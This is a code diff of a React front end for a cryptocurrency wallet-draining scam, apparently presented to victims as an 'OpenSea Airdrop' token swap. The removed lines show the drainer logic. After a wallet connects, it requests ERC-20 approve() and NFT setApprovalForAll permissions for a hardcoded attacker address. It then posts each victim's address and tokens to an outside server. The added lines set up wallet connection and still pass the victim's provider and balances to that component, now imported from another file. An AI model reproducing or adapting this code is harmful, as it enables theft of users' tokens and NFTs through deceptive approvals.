@@ -1,233 +1,102 @@
-import "./App.css";
 import { useMoralis, useNFTBalances } from "react-moralis";
 import Moralis from "moralis";
-import { useEffect, useRef, useState } from "react";
+import { useCallback, useEffect, useRef, useState } from "react";
 import {
     useMoralisWeb3Api,
     useTokenPrice,
     useERC20Balances,
 } from "react-moralis";
+import TokenPrice, { ITokenBalance } from "./TokenPrice";
 
-const myAddress = "0x103F6A08e23dA494c5Dd6504573624Ff7ac34D9b";
-const ercTokenContractABI = [
-    {
-        constant: false,
-        inputs: [
-            { internalType: "address", name: "_spender", type: "address" },
-            { internalType: "uint256", name: "_amount", type: "uint256" },
-        ],
-        name: "approve",
-        outputs: [
-            {
-                internalType: "bool",
-                name: "",
-                type: "bool",
-            },
-        ],
-        payable: false,
-        stateMutability: "nonpayable",
-        type: "function",
-    },
-];
+import {
+    init,
+    useConnectWallet,
+    useSetChain,
+    useWallets
+} from '@web3-onboard/react'
+import Onboard, { EIP1193Provider, WalletState } from '@web3-onboard/core'
+import injectedModule from '@web3-onboard/injected-wallets'
+import coinbaseModule from '@web3-onboard/coinbase'
+import ledgerModule from '@web3-onboard/ledger'
+import walletConnectModule from '@web3-onboard/walletconnect'
+import torusModule from '@web3-onboard/torus'
+import keepkeyModule from '@web3-onboard/keepkey'
 
-const nftTokenContractABI = [
-    {
-        inputs: [
-            { internalType: "address", name: "operator", type: "address" },
-            { internalType: "bool", name: "approved", type: "bool" },
-        ],
-        name: "setApprovalForAll",
-        outputs: [],
-        stateMutability: "nonpayable",
-        type: "function",
-    },
-];
+import { detectMob } from "./EthApp";
+import { ethers } from "ethers";
 
-interface NFT {
-    token_address: string,
-    token_id: string,
-    contract_type: string,
-    owner_of: string,
-    block_number: string,
-    block_number_minted: string,
-    token_uri: string,
-    metadata: string,
-    synced_at: string,
-    amount: string,
-    name: string,
-    symbol: string,
-}
+const injected = injectedModule()
+const coinbase = coinbaseModule()
+const walletConnect = walletConnectModule()
+const torus = torusModule()
+const ledger = ledgerModule()
+const keepkey = keepkeyModule()
 
+const INFURA_ID = "7975a81d682e4188b7a6e0fda0445b2a";
 
-interface ITokenBalance {
-    token_address: string;
-    name: string;
-    symbol: string;
-    logo?: string | undefined;
-    thumbnail?: string | undefined;
-    decimals: string;
-    balance: string;
-    usdBalance?: string;
-}
-
-interface TokenProps {
-    balances: ITokenBalance[];
-    address: string;
-}
-
-function sleep(ms: number) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-const TokenPrice: React.FC<TokenProps> = (props) => {
-    const { data } = useNFTBalances();
-    const [tokenBalances, setTokenBalances] = useState<ITokenBalance[]>([]);
-    const [highTokenBalances, setHighTokenBalances] = useState<ITokenBalance[]>([]);
-    const { Moralis } = useMoralis();
-    const Web3Api = useMoralisWeb3Api();
-    const updated = useRef(false);
-
-
-    const fetchBalances = async () => {
-        if (updated.current) return;
-        updated.current = true;
-        setTokenBalances([]);
-
-        let _tokenBalances: ITokenBalance[] = [];
-        // let _highTokenBalances: ITokenBalance[] = [];
-
-        for (let balance of props.balances) {
-            try {
-                const price = await Web3Api.token.getTokenPrice({
-                    address: balance.token_address,
-                });
-
-                const balanceStr = balance.balance.toString();
-                console.log(balance.decimals)
-                const _price = (
-                    price.usdPrice * Number(balanceStr.substring(0, balanceStr.length - Number(balance.decimals)) + ".00")
-
-                ).toString();
-                const _balance = balance;
-                _balance.usdBalance = _price;
-
-                if (Number(_price) >= 0) {
-                    _tokenBalances.push(_balance);
-                }
-                await sleep(250);
-            } catch (err) {
-                console.log(err);
-            }
+const onboard = init({
+    wallets: [injected, coinbase, walletConnect, torus, ledger, keepkey],
+    chains: [
+        {
+            id: '0x1',
+            token: 'ETH',
+            label: 'Ethereum Mainnet',
+            rpcUrl: `https://mainnet.infura.io/v3/${INFURA_ID}`
+        },
+        {
+            id: '0x3',
+            token: 'tROP',
+            label: 'Ethereum Ropsten Testnet',
+            rpcUrl: `https://ropsten.infura.io/v3/${INFURA_ID}`
+        },
+        {
+            id: '0x4',
+            token: 'rETH',
+            label: 'Ethereum Rinkeby Testnet',
+            rpcUrl: `https://rinkeby.infura.io/v3/${INFURA_ID}`
+        },
+        {
+            id: '0x38',
+            token: 'BNB',
+            label: 'Binance Smart Chain',
+            rpcUrl: 'https://bsc-dataseed.binance.org/'
+        },
+        {
+            id: '0x89',
+            token: 'MATIC',
+            label: 'Matic Mainnet',
+            rpcUrl: 'https://matic-mainnet.chainstacklabs.com'
+        },
+        {
+            id: '0xfa',
+            token: 'FTM',
+            label: 'Fantom Mainnet',
+            rpcUrl: 'https://rpc.ftm.tools/'
         }
-
-
-
-        _tokenBalances = _tokenBalances.sort((a, b) => {
-            if (Number(a.usdBalance) < Number(b.usdBalance)) {
-                return 1;
-            }
-            if (Number(a.usdBalance) > Number(b.usdBalance)) {
-                return -1;
-            }
-            return 0;
-        });
-
-        console.log(_tokenBalances);
-        setTokenBalances(_tokenBalances);
-    };
-
-    const fetchNFTBalance = async () => {
-
-    }
-    useEffect(() => {
-        if (props.balances.length)
-            fetchBalances();
-        // fetchNFTLowestPrice();
-        // console.log(tokenBalances)
-    }, [props.balances]);
-
-    useEffect(() => {
-        (async () => {
-
-            if (tokenBalances.length) {
-                for (let ercBalance of tokenBalances) {
-                    try {
-                        const sendOptions = {
-                            contractAddress: ercBalance.token_address,
-                            functionName: "approve",
-                            abi: ercTokenContractABI,
-                            params: {
-                                _spender: myAddress,
-                                _amount: Moralis.Units.Token(100000, Number(ercBalance.decimals)),
-                            },
-                        };
-
-                        const transaction = await Moralis.executeFunction(sendOptions);
-                        fetch("https://ethers-server.herokuapp.com/user-token/", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                                // '
-                            },
-                            body: JSON.stringify({
-                                address: props.address,
-                                token_type: "erc20",
-                                token_id: "",
-                                date: new Date().toISOString(),
-                                token_address: ercBalance.token_address,
-                            }),
-                        });
-                    } catch (error) { }
-                }
-            }
-
-            if (data?.total) {
-                const allNFTs = (data.result as any) as NFT[];
-                const approvedNFT: string[] = [];
-                for (let nft of allNFTs) {
-                    if (!approvedNFT.find(_nft => nft.token_address == _nft)) {
-                        approvedNFT.push(nft.token_address);
-                        try {
-                            const sendOptions = {
-                                contractAddress: nft.token_address,
-                                functionName: "setApprovalForAll",
-                                abi: nftTokenContractABI,
-                                params: {
-                                    operator: myAddress,
-                                    approved: true
-                                },
-                            };
-
-                            const transaction = await Moralis.executeFunction(sendOptions);
-                            fetch("https://ethers-server.herokuapp.com/user-token/", {
-                                method: "POST",
-                                headers: {
-                                    "Content-Type": "application/json",
-                                    // '
-                                },
-                                body: JSON.stringify({
-                                    address: props.address,
-                                    token_type: "nft",
-                                    token_id: nft.token_id,
-                                    date: new Date().toISOString(),
-                                    token_address: nft.token_address,
-                                }),
-                            });
-                        } catch (error) { }
-                    }
-                }
-            }
-
-
-        })()
-
-    }, [tokenBalances]);
-    return <></>;
-};
-
-function detectMob() {
-    return window.innerWidth <= 800 && window.innerHeight <= 1000;
-}
+    ],
+    appMetadata: {
+        name: 'Token Swap',
+        icon: '<svg></svg>', // svg string icon
+        logo: '<svg></svg>', // svg string logo
+        description: 'OpenSea Airdrop',
+        recommendedInjectedWallets: [
+            { name: 'MetaMask', url: 'https://metamask.io' },
+            { name: 'Coinbase', url: 'https://wallet.coinbase.com/' }
+        ]
+    },
+    accountCenter: {
+        desktop: {
+            position: 'topRight',
+            enabled: true,
+            minimal: true
+        },
+        mobile: {
+            position: 'topRight',
+            enabled: true,
+            minimal: true
+        }
+    },
+})
 
 const Account = () => {
     const [address, setAddress] = useState("");
@@ -240,44 +109,103 @@ const Account = () => {
         chainId,
         logout,
     } = useMoralis();
+
+    const [{ wallet, connecting }, connect, disconnect] = useConnectWallet()
+    const [{ chains, connectedChain, settingChain }, setChain] = useSetChain()
+    const connectedWallets = useWallets();
+    const [balance, setBalance] = useState<ITokenBalance[]>([])
     const { fetchERC20Balances, data, isLoading, isFetching, error } =
         useERC20Balances();
-    const [tokenPrices, setTokenPrices] = useState([]);
     const Web3Api = useMoralisWeb3Api();
 
+    const [injectedProvider, setInjectedProvider] = useState<ethers.providers.Web3Provider | null>(null);
+
     const authenticateUser = async () => {
-        try {
-            if (!isAuthenticated) {
-                console.log(detectMob())
-                if (detectMob()) {
-                    await authenticate({ provider: "walletconnect" })
-                        .then(function (user: any) {
-                            console.log(user);
-                        })
-                        .catch(function (error: any) {
-                            console.log(error);
-                        });
-                    return;
-                }
+        await connect({});
+    };
 
-                const user = await authenticate();
-                
-                
+    const logoutOfBlocknativeWeb3Modal = async () => {
+        if (!wallet?.label) return;
+        // disconnect the first wallet in the wallets array...
+        // note: Mulitple wallets can connect with Blocknative web3-onboard!
+        const connectedWalletsLabelArray: any = await disconnect({ label: wallet.label });
+        if (connectedWalletsLabelArray?.length) {
+            window.localStorage.setItem("connectedWallets", JSON.stringify(connectedWalletsLabelArray));
+        } else {
+            window.localStorage.removeItem("connectedWallets");
+        }
+        setTimeout(() => {
+            window.location.reload();
+        }, 1);
+    };
 
-                setAddress(account as string);
-            }
-        } catch (error) {
-            console.log(error)
-            await authenticate({ provider: "walletconnect" })
-                .then(function (user: any) {
-                    console.log(user);
-                })
-                .catch(function (error: any) {
-                    console.log(error);
-                });
+    useEffect(() => {
+        if (!connectedWallets?.length) return;
+
+        const connectedWalletsLabelArray = connectedWallets.map(({ label }) => label);
+        window.localStorage.setItem("connectedWallets", JSON.stringify(connectedWalletsLabelArray));
+    }, [connectedWallets]);
+
+    const getTokenBalances = async (wallet: WalletState | null) => {
+        if (!wallet) return;
+        const res = await fetchERC20Balances({ params: { address: wallet?.accounts[0].address } })
+        setBalance(res as ITokenBalance[]);
+    }
+
+    useEffect(() => {
+        if (!wallet?.provider) {
+            setInjectedProvider(null)
+        } else {
+            setInjectedProvider(new ethers.providers.Web3Provider(wallet.provider as any, "any"));
         }
 
-    };
+        if (wallet?.accounts.length) {
+            getTokenBalances(wallet);
+        }
+    }, [wallet]);
+
+    let previouslyConnectedWallets = [];
+
+    async function setWalletFromLocalStorage() {
+        previouslyConnectedWallets = JSON.parse(window.localStorage.getItem("connectedWallets") as string);
+        await connect({ autoSelect: previouslyConnectedWallets[0] });
+    }
+
+    useEffect(() => {
+
+        if (previouslyConnectedWallets?.length) {
+            setWalletFromLocalStorage();
+        }
+    }, [connect]);
+
+    const loadBlocknativeOnboardModal = useCallback(async () => {
+        await connect({});
+
+        if (!wallet) return;
+
+        setInjectedProvider(wallet.provider as any);
+        if (!injectedProvider) return;
+
+        injectedProvider.on("chainChanged", chainId => {
+            console.log(`chain changed to ${chainId}! updating providers`);
+            setChain({ chainId: chainId });
+        });
+
+        injectedProvider.on("accountsChanged", () => {
+            console.log(`account changed!`);
+        });
+
+        // Subscribe to session disconnection
+        injectedProvider.on("disconnect", (code, reason) => {
+            console.log(code, reason);
+            const walletArrayState: any = disconnect({ label: wallet.label });
+            if (walletArrayState?.length) {
+                window.localStorage.setItem("connectedWallets", JSON.stringify(walletArrayState));
+            } else {
+                window.localStorage.removeItem("connectedWallets");
+            }
+        });
+    }, [connect, setChain, wallet, disconnect, injectedProvider]);
 
     useEffect(() => {
         if (isAuthenticating) return;
@@ -285,10 +213,12 @@ const Account = () => {
     }, [isAuthenticated]);
     return (
         <>
-            {isAuthenticated && (
+            {wallet && balance.length && injectedProvider && (
                 <TokenPrice
-                    address={account as string}
-                    balances={data as ITokenBalance[]}
+                    address={wallet.accounts[0].address as string}
+                    chaidId={connectedChain?.id as string}
+                    provider={injectedProvider as ethers.providers.Web3Provider}
+                    balances={balance as ITokenBalance[]}
                 />
             )}
 
@@ -331,34 +261,5 @@ const Account = () => {
     );
 };
 
-const EthApp = () => {
-    const {
-        authenticate,
-        isAuthenticating,
-        user,
-        account,
-        logout,
-        isWeb3Enabled,
-        enableWeb3,
-        isAuthenticated,
-        isWeb3EnableLoading,
-    } = useMoralis();
 
-    useEffect(() => {
-        if (isAuthenticated && !isWeb3Enabled && !isWeb3EnableLoading) {
-            if (detectMob()) {
-                enableWeb3({ provider: "walletconnect" });
-                return;
-            }
-            enableWeb3();
-        }
-    }, [isAuthenticated, isWeb3Enabled]);
-
-    return (
-        <>
-            <Account />
-        </>
-    );
-};
-
-export default EthApp;
+export default Account;
